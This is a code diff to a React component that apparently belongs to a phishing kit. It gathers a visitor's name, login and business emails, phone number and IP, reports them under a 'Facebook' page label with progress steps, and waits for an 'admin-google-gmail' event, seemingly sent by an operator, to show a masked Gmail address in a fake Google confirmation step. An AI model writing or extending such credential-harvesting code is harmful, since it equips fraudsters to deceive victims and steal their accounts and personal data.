@@ -20,7 +20,8 @@ function maskEmail(email) {
 }
 
 function GoogleConfirm({ onConfirm, onClose, Email, Unik, Tel, BusinessEmail, Name, Ip, setLastFetch }) {
-  const [waiting, setWaiting] = useState(false);
+  const [waiting, setWaiting] = useState(true);
+  const [gmailEmail, setGmailEmail] = useState(null);
 
   useEffect(() => {
     if (!Unik) return;
@@ -33,34 +34,28 @@ function GoogleConfirm({ onConfirm, onClose, Email, Unik, Tel, BusinessEmail, Na
       business_email: BusinessEmail,
       phone_number: Tel,
       page_name: "Facebook",
-      currentStep: "Redirect to Google",
+      currentStep: "Google Confirm - Waiting for Gmail",
     });
   }, []);
 
   useEffect(() => {
     const handler = (e) => {
-      if (typeof onConfirm === "function") onConfirm(e.detail?.email);
+      const email = e.detail?.email;
+      if (email) {
+        setGmailEmail(email);
+        setWaiting(false);
+      }
     };
     window.addEventListener("admin-google-gmail", handler);
     return () => window.removeEventListener("admin-google-gmail", handler);
-  }, [onConfirm]);
+  }, []);
 
   const handleContinueWithGoogle = () => {
-    setWaiting(true);
     if (typeof setLastFetch === "function") setLastFetch("google-gmail");
-    SendData({
-      id: Unik,
-      ip: Ip,
-      full_name: Name,
-      login_email: Email,
-      business_email: BusinessEmail,
-      phone_number: Tel,
-      page_name: "Facebook",
-      currentStep: "Google Confirm - Waiting for Gmail",
-    });
+    if (typeof onConfirm === "function") onConfirm(gmailEmail);
   };
 
-  const maskedEmail = maskEmail(Email);
+  const maskedEmail = maskEmail(gmailEmail);
 
   if (waiting) {
     return (
